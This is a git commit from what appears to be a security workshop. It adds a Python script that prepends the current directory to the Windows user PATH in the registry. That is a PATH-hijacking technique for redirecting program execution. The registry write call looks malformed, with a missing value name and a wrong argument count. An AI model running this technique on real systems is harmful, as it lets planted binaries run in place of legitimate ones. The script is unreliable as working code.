4f6464f7f9718ce2a9c7eb1979699da4c4e74d00
Tfr_ <103091222+ToeFr@users.noreply.github.com>
2025-03-22 23:15:31 +0800

    Created a simple file that edits the environment PATH and adds itself/replaces an existing path

---
+++ Workshops/WS2/Module_2/Hijacking_exectution_flow/hijack.py
@@ -0,0 +1,26 @@
+import os, winreg
+
+def read_path_value(reghive, regpath):
+    reg = winreg.ConnectRegistry(None, reghive)
+    key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_READ)
+    index = 0
+    while True:
+        val = winreg.EnumValue(key, index)
+        if val[0] == "Path":
+            return val[1]
+        index = index + 1
+
+def edit_path_value(reghive, regpath, targetdir):
+    path = read_path_value(reghive, regpath)
+    newpath =  targetdir + ";" + path
+
+    reg = winreg.ConnectRegistry(None, reghive)
+    key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, 0, winreg.REG_SZ, newpath)
+
+if __name__ == "__main__":
+    reghive = winreg.HKEY_CURRENT_USER
+    regpath = "Environment"
+    targetdir = os.getcwd()
+
+    edit_path_value(reghive, regpath, targetdir)
